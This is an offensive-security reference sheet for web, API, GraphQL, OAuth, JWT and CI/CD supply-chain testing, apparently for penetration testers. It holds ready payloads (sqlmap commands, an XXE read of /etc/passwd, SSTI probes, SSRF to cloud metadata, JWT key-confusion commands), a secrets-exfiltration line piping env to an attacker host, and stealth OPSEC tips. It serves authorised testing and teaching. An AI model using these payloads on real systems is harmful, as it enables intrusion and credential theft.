# Web + API + Supply Chain Reference

## Key Tools
- **Burp Suite Pro** — Intercepting proxy, scanner, Intruder, Repeater
- **ffuf / feroxbuster** — Directory and parameter fuzzing
- **nuclei** — Template-based vulnerability scanner
- **sqlmap** — SQL injection automation
- **dalfox** — XSS scanner with DOM analysis
- **jwt_tool** — JWT attack toolkit (alg:none, RS256→HS256, key confusion)
- **GraphQL-Voyager / clairvoyance** — GraphQL schema introspection
- **ghauri** — Advanced SQL injection (alternative to sqlmap)
- **caido** — Modern web proxy alternative to Burp

---

## OWASP Top 10 (2021) — Attack Focus

### A01 Broken Access Control
- IDOR: change `userId=123` → `userId=124`, test horizontal/vertical escalation
- Path traversal: `../../../../etc/passwd`, `..%2F..%2F`
- Forced browsing: enumerate `/admin`, `/internal`, `/debug` endpoints
- Missing function-level access control on API routes

### A02 Cryptographic Failures
- HTTP → HTTPS downgrade, HSTS missing
- Weak JWT secrets (`secret`, `password`, empty string)
- ECB mode block cipher patterns in encrypted data
- Hardcoded keys in JS source / mobile APK

### A03 Injection
```bash
# SQLi detection
sqlmap -u "https://target.com/api/user?id=1" --dbs --batch --level=3 --risk=2

# Blind SQLi with timing
sqlmap -u "https://target.com/api/user?id=1" --technique=T --dbms=mssql

# XXE
POST /api/parse
Content-Type: application/xml
<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>

# SSTI (Flask/Jinja2)
{{7*7}}  →  49  →  {{config.items()}}  →  {{''.__class__.__mro__[1].__subclasses__()}}
```

### A07 Identification and Authentication Failures
- Credential stuffing: ffuf with userpass lists
- Password reset token predictability / reuse
- JWT alg:none, weak secret brute-force

### A10 SSRF (T1190)
```
# Cloud IMDS
https://target.com/fetch?url=http://169.254.169.254/latest/meta-data/
# Internal service discovery
https://target.com/fetch?url=http://internal-elastic:9200/_cat/indices
```

---

## Business Logic Testing

Areas scanners miss entirely:
- **Multi-step flow bypass**: skip step 2 of 3 in checkout, go direct to step 3
- **Race conditions**: concurrent requests for one-time-use tokens, promo codes
- **IDOR with indirect reference**: object referenced by hash/UUID — enumerate via API leak
- **Price manipulation**: negative quantity, discount stacking, currency confusion
- **Mass assignment**: POST extra fields (`isAdmin: true`, `role: admin`) in JSON body

---

## GraphQL Attacks

```bash
# Introspection dump
clairvoyance https://target.com/graphql -o schema.json

# Batch query (bypass rate limiting)
[{"query":"{ user(id:1){email} }"},{"query":"{ user(id:2){email} }"},...]

# Introspection disabled? — field suggestion enumeration
{ __typename }  →  look for "Did you mean..." in errors
```

---

## OAuth 2.1 / OIDC Attacks

- **Authorization code interception**: redirect_uri not strictly validated → capture code
- **State parameter missing**: CSRF on OAuth flow
- **Token leakage in Referer**: access_token in URL fragment leaks in logs
- **Open redirect chained with OAuth**: redirect_uri=https://target.com/redir?url=evil.com

---

## JWT Attacks (jwt_tool)
```bash
# Check for alg:none
jwt_tool TOKEN -X a

# RS256 → HS256 key confusion (use public key as HMAC secret)
jwt_tool TOKEN -X k -pk public.pem

# Brute-force weak secret
jwt_tool TOKEN -C -d wordlist.txt
```

---

## Supply Chain (CI/CD) Attacks

### GitHub Actions Poisoning
- Inject `${{ github.event.pull_request.head.sha }}` into run steps (script injection)
- Compromise third-party actions via tag mutability
- Secrets exfil: `env | curl -d @- https://attacker.com`

### Dependency Confusion (T1195.001)
- Find internal package names from error messages / package.json / requirements.txt
- Publish to PyPI/npm with matching name at higher version

### OPSEC Notes
- SQLmap `--level=5 --risk=3` generates massive noise — use targeted payloads in Burp
- SSRF probes to IMDS are logged in cloud audit trails
- GraphQL introspection queries are often logged; avoid in production stealth engagements
